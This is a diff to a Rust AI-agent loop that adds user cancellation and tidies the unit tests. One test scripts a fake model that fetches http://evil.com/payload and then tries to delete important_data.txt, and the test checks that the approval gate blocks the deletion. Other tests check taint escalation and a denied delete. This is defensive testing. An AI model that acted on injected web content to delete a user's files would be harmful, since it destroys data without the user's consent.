@@ -1,6 +1,7 @@
 use std::sync::Arc;
 
 use futures::StreamExt;
+use tokio_util::sync::CancellationToken;
 
 use crate::events::ApprovalDecision;
 use crate::llm::types::{FunctionResponse, Message, Role};
@@ -47,6 +48,7 @@ pub enum AgentEvent {
 pub enum AgentError {
     Llm(String),
     MaxSteps,
+    Cancelled,
 }
 
 impl std::fmt::Display for AgentError {
@@ -54,6 +56,7 @@ impl std::fmt::Display for AgentError {
         match self {
             AgentError::Llm(msg) => write!(f, "LLM error: {}", msg),
             AgentError::MaxSteps => write!(f, "reached maximum steps"),
+            AgentError::Cancelled => write!(f, "cancelled by user"),
         }
     }
 }
@@ -88,6 +91,7 @@ pub struct AgentLoop {
     pub config: AgentConfig,
     pub memory_retriever: Option<Arc<MemoryRetriever>>,
     pub memory_extractor: Option<Arc<MemoryExtractor>>,
+    pub cancel_token: Option<CancellationToken>,
 }
 
 impl AgentLoop {
@@ -105,6 +109,12 @@ impl AgentLoop {
         let system_prompt = self.build_system_prompt(messages).await;
 
         for _step in 0..self.config.max_steps {
+            if let Some(token) = &self.cancel_token
+                && token.is_cancelled()
+            {
+                return Err(AgentError::Cancelled);
+            }
+
             self.audit
                 .log_llm_call(&self.config.session_id, &self.config.model);
 
@@ -119,6 +129,11 @@ impl AgentLoop {
             let mut function_calls = Vec::new();
 
             while let Some(result) = stream.next().await {
+                if let Some(token) = &self.cancel_token
+                    && token.is_cancelled()
+                {
+                    return Err(AgentError::Cancelled);
+                }
                 match result {
                     Ok(chunk) => {
                         if chunk.done {
@@ -347,6 +362,7 @@ mod tests {
             },
             memory_retriever: None,
             memory_extractor: None,
+            cancel_token: None,
         }
     }
 
@@ -362,11 +378,7 @@ mod tests {
     #[tokio::test]
     async fn test_read_tool_auto_executes() {
         let agent = test_agent(FakeProvider::new(vec![
-            ScriptedReply::with_calls(vec![FunctionCall {
-                name: "system.time".into(),
-                args: serde_json::json!({}),
-                call_id: "c1".into(),
-            }]),
+            ScriptedReply::with_calls(vec![FunctionCall::new("system.time", serde_json::json!({}), "c1")]),
             ScriptedReply::text("The time is now."),
         ]));
         let mut msgs = vec![Message::user("what time?")];
@@ -379,11 +391,7 @@ mod tests {
     #[tokio::test]
     async fn test_confirm_tool_denied() {
         let agent = test_agent(FakeProvider::new(vec![
-            ScriptedReply::with_calls(vec![FunctionCall {
-                name: "files.delete".into(),
-                args: serde_json::json!({"path": "important.txt"}),
-                call_id: "c1".into(),
-            }]),
+            ScriptedReply::with_calls(vec![FunctionCall::new("files.delete", serde_json::json!({"path": "important.txt"}), "c1")]),
             ScriptedReply::text("Could not delete."),
         ]));
         let mut msgs = vec![Message::user("delete important.txt")];
@@ -400,16 +408,8 @@ mod tests {
     #[tokio::test]
     async fn test_injection_cannot_trigger_deletion() {
         let agent = test_agent(FakeProvider::new(vec![
-            ScriptedReply::with_calls(vec![FunctionCall {
-                name: "web.fetch".into(),
-                args: serde_json::json!({"url": "http://evil.com/payload"}),
-                call_id: "c1".into(),
-            }]),
-            ScriptedReply::with_calls(vec![FunctionCall {
-                name: "files.delete".into(),
-                args: serde_json::json!({"path": "important_data.txt"}),
-                call_id: "c2".into(),
-            }]),
+            ScriptedReply::with_calls(vec![FunctionCall::new("web.fetch", serde_json::json!({"url": "http://evil.com/payload"}), "c1")]),
+            ScriptedReply::with_calls(vec![FunctionCall::new("files.delete", serde_json::json!({"path": "important_data.txt"}), "c2")]),
             ScriptedReply::text("I see, the action was denied."),
         ]));
         let mut msgs = vec![Message::user("fetch http://evil.com/payload")];
@@ -429,16 +429,8 @@ mod tests {
     #[tokio::test]
     async fn test_taint_escalates_safe_to_confirm() {
         let agent = test_agent(FakeProvider::new(vec![
-            ScriptedReply::with_calls(vec![FunctionCall {
-                name: "files.read".into(),
-                args: serde_json::json!({"path": "nonexistent.txt"}),
-                call_id: "c1".into(),
-            }]),
-            ScriptedReply::with_calls(vec![FunctionCall {
-                name: "apps.open".into(),
-                args: serde_json::json!({"target": "notepad"}),
-                call_id: "c2".into(),
-            }]),
+            ScriptedReply::with_calls(vec![FunctionCall::new("files.read", serde_json::json!({"path": "nonexistent.txt"}), "c1")]),
+            ScriptedReply::with_calls(vec![FunctionCall::new("apps.open", serde_json::json!({"target": "notepad"}), "c2")]),
             ScriptedReply::text("Done."),
         ]));
         let mut msgs = vec![Message::user("read file and open notepad")];
